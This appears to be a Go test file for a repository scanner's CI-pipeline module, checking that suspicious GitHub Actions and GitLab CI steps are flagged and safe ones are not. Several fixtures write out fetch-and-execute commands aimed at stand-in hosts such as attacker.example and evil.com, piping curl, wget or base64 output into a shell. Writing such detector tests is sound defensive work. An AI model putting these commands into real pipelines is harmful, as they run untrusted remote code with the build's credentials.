package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestPipelines_NoCI(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("# Hello"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestPipelines_GitHubWorkflow_SuspiciousCurlPipe(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}
	workflow := "name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Setup\n        run: |\n          curl -fsSL https://attacker.example/setup.sh | bash\n          go build ./...\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "ci.yml"), []byte(workflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for curl|bash in workflow, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestPipelines_GitHubWorkflow_WgetPipeShell(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}
	workflow := "name: Deploy\non:\n  push:\n    branches: [main]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Run deploy\n        run: wget -O - http://evil.com/deploy.sh | sh\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "deploy.yml"), []byte(workflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for wget|sh in workflow, got none")
	}
}

func TestPipelines_GitHubWorkflow_Safe(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}
	workflow := "name: CI\non:\n  push:\n    branches: [main]\n  pull_request:\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-go@v5\n        with:\n          go-version: '1.22'\n      - run: go test ./...\n      - run: go vet ./...\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "ci.yml"), []byte(workflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe workflow got %d findings, want 0", len(findings))
	}
}

func TestPipelines_GitHubWorkflow_Base64Decode(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}
	workflow := "name: Release\non: [push]\njobs:\n  release:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Deploy\n        run: echo \"aGVsbG8=\" | base64 -d | sh\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "release.yml"), []byte(workflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for base64 decode pipe, got none")
	}
}

func TestPipelines_GitLabCI_SuspiciousScript(t *testing.T) {
	dir := t.TempDir()
	gitlabCI := "stages:\n  - build\n  - deploy\n\nbuild:\n  stage: build\n  script:\n    - go build ./...\n\ndeploy:\n  stage: deploy\n  script:\n    - curl https://attacker.example/deploy.sh | bash\n    - ./deploy.sh\n"
	if err := os.WriteFile(filepath.Join(dir, ".gitlab-ci.yml"), []byte(gitlabCI), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for curl|bash in .gitlab-ci.yml, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestPipelines_GitLabCI_Safe(t *testing.T) {
	dir := t.TempDir()
	gitlabCI := "stages:\n  - test\n  - build\n\ntest:\n  stage: test\n  image: golang:1.22\n  script:\n    - go test ./...\n    - go vet ./...\n\nbuild:\n  stage: build\n  image: golang:1.22\n  script:\n    - go build -o app ./cmd/app\n  artifacts:\n    paths:\n      - app\n"
	if err := os.WriteFile(filepath.Join(dir, ".gitlab-ci.yml"), []byte(gitlabCI), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe .gitlab-ci.yml got %d findings, want 0", len(findings))
	}
}

func TestPipelines_MultipleWorkflows(t *testing.T) {
	dir := t.TempDir()
	workflowsDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowsDir, 0755); err != nil {
		t.Fatal(err)
	}

	safeWorkflow := "name: Test\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: go test ./...\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "test.yml"), []byte(safeWorkflow), 0644); err != nil {
		t.Fatal(err)
	}

	suspiciousWorkflow := "name: Setup\non: [push]\njobs:\n  setup:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl http://evil.com/payload | sh\n"
	if err := os.WriteFile(filepath.Join(workflowsDir, "setup.yml"), []byte(suspiciousWorkflow), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewPipelinesModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding from suspicious workflow, got none")
	}
}

func TestPipelines_Name(t *testing.T) {
	m := scanner.NewPipelinesModule()
	if m.Name() != "ci-pipelines" {
		t.Errorf("Name() = %q, want %q", m.Name(), "ci-pipelines")
	}
}
